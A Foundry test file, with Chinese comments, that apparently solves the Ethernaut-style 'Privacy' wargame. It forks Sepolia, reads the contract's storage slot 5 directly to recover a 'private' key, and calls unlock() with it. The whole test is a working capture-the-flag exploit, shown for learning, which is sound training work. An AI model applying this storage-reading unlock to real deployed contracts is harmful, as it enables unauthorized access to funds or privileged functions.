// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {stdStorage, StdStorage} from "forge-std/Test.sol";  
import {Privacy} from "../src/Privacy.sol";

contract PrivacyTest is Test {
    using stdStorage for StdStorage;

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6665461);
    }

    function test_Unlock() public {
        Privacy privacy = Privacy(0xFc3aef6227C7195a6aBDf6C00C63ef86F17cBAe6);

        // 直接读取槽 5 中的数据，data[2] 的值
        // bytes32 dataValue = vm.load(address(privacy), bytes32(uint256(5)));
        bytes32 dataValue = vm.load(address(privacy), bytes32(uint256(5)));

        // 输出 data[2] 的数据
        console.logBytes32(dataValue);

        // 使用 data[2] 的前 16 字节作为 key 解锁合约
        privacy.unlock(bytes16(dataValue));

        // 验证合约是否已解锁
        assert(!privacy.locked());
    }

}
